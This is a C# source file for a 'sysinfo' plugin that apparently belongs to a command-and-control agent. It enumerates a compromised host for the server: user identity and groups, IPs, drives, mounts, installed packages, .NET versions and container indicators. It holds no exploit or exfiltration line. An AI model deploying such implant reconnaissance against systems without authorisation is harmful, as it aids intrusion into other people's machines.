using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "sysinfo";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            var args = JsonSerializer.Deserialize<sysinfo.SysinfoArgs>(job.task.parameters);

            if (args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Failed to deserialize arguments.",
                    task_id = job.task.id,
                    status = "error"
                });
                return;
            }

            try
            {
                string result = args.action switch
                {
                    "sysinfo" => GetSysinfo(),
                    "id" => GetId(),
                    "container-detect" => DetectContainer(),
                    "mount" => GetMounts(),
                    "package-list" => GetPackages(),
                    "dotnet-versions" => GetDotnetVersions(),
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id,
                });
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string GetSysinfo()
        {
            var sb = new StringBuilder();
            sb.AppendLine($"Hostname: {Environment.MachineName}");
            sb.AppendLine($"Username: {Environment.UserName}");
            sb.AppendLine($"OS: {RuntimeInformation.OSDescription}");
            sb.AppendLine($"Architecture: {RuntimeInformation.OSArchitecture}");
            sb.AppendLine($"Process Architecture: {RuntimeInformation.ProcessArchitecture}");
            sb.AppendLine($".NET Version: {Environment.Version}");
            sb.AppendLine($"Processors: {Environment.ProcessorCount}");

            try
            {
                var addresses = Dns.GetHostAddresses(Dns.GetHostName());
                foreach (var addr in addresses)
                {
                    sb.AppendLine($"IP: {addr}");
                }
            }
            catch { }

            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady)
                    {
                        sb.AppendLine(
                            $"Drive {drive.Name}: {drive.TotalFreeSpace / (1024 * 1024)} MB free" +
                            $" / {drive.TotalSize / (1024 * 1024)} MB total ({drive.DriveFormat})");
                    }
                }
            }
            catch { }

            return sb.ToString();
        }

        private string GetId()
        {
            var sb = new StringBuilder();
            sb.AppendLine($"Username: {Environment.UserName}");
            sb.AppendLine($"Domain: {Environment.UserDomainName}");

            if (OperatingSystem.IsWindows())
            {
                try
                {
                    var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                    sb.AppendLine($"SID: {identity.User}");
                    if (identity.Groups != null)
                    {
                        sb.AppendLine("Groups:");
                        foreach (var group in identity.Groups)
                        {
                            try
                            {
                                var account = group.Translate(
                                    typeof(System.Security.Principal.NTAccount));
                                sb.AppendLine($"  {account.Value}");
                            }
                            catch
                            {
                                sb.AppendLine($"  {group.Value}");
                            }
                        }
                    }
                }
                catch { }
            }
            else
            {
                sb.AppendLine($"UID: {GetUid()}");
                sb.AppendLine($"GID: {GetGid()}");
            }

            return sb.ToString();
        }

        [DllImport("libc")]
        private static extern uint getuid();

        [DllImport("libc")]
        private static extern uint getgid();

        private uint GetUid()
        {
            try { return getuid(); }
            catch { return 0; }
        }

        private uint GetGid()
        {
            try { return getgid(); }
            catch { return 0; }
        }

        private string DetectContainer()
        {
            var sb = new StringBuilder();
            bool inContainer = false;

            if (File.Exists("/.dockerenv"))
            {
                sb.AppendLine("Docker: YES (/.dockerenv exists)");
                inContainer = true;
            }

            try
            {
                if (File.Exists("/proc/1/cgroup"))
                {
                    string cgroup = File.ReadAllText("/proc/1/cgroup");
                    if (cgroup.Contains("docker") || cgroup.Contains("kubepods")
                        || cgroup.Contains("containerd"))
                    {
                        string detected = cgroup.Contains("docker") ? "Docker"
                            : cgroup.Contains("kubepods") ? "Kubernetes"
                            : "containerd";
                        sb.AppendLine($"Container detected via cgroup: {detected}");
                        inContainer = true;
                    }
                }
            }
            catch { }

            if (Environment.GetEnvironmentVariable("KUBERNETES_SERVICE_HOST") != null)
            {
                sb.AppendLine("Kubernetes: YES (KUBERNETES_SERVICE_HOST set)");
                inContainer = true;
            }

            if (!inContainer)
                sb.AppendLine("No container indicators detected.");

            return sb.ToString();
        }

        private string GetMounts()
        {
            if (OperatingSystem.IsWindows())
            {
                var sb = new StringBuilder();
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady)
                        sb.AppendLine(
                            $"{drive.Name}\t{drive.DriveType}\t{drive.DriveFormat}" +
                            $"\t{drive.TotalSize / (1024 * 1024)} MB");
                }
                return sb.ToString();
            }

            try
            {
                if (File.Exists("/proc/mounts"))
                    return File.ReadAllText("/proc/mounts");
                if (File.Exists("/etc/mtab"))
                    return File.ReadAllText("/etc/mtab");
            }
            catch { }

            return "Could not read mount information.";
        }

        private string GetPackages()
        {
            if (OperatingSystem.IsWindows())
                return "Package listing not supported on Windows (use WMI).";

            try
            {
                if (File.Exists("/var/lib/dpkg/status"))
                {
                    var packages = File.ReadAllLines("/var/lib/dpkg/status")
                        .Where(l => l.StartsWith("Package: "))
                        .Select(l => l.Substring(9));
                    return string.Join(Environment.NewLine, packages);
                }

                string rpmDb = "/var/lib/rpm";
                if (Directory.Exists(rpmDb))
                    return "RPM database found. Use rpm -qa on target for listing.";
            }
            catch { }

            return "No package manager detected.";
        }

        private string GetDotnetVersions()
        {
            var sb = new StringBuilder();

            string[] searchPaths = OperatingSystem.IsWindows()
                ? new[] { @"C:\Program Files\dotnet\shared\Microsoft.NETCore.App" }
                : new[]
                {
                    "/usr/share/dotnet/shared/Microsoft.NETCore.App",
                    "/usr/local/share/dotnet/shared/Microsoft.NETCore.App"
                };

            foreach (var searchPath in searchPaths)
            {
                if (Directory.Exists(searchPath))
                {
                    foreach (var dir in Directory.GetDirectories(searchPath))
                    {
                        sb.AppendLine(Path.GetFileName(dir));
                    }
                }
            }

            if (sb.Length == 0)
                sb.AppendLine($"Running: .NET {Environment.Version}");

            return sb.ToString();
        }
    }
}
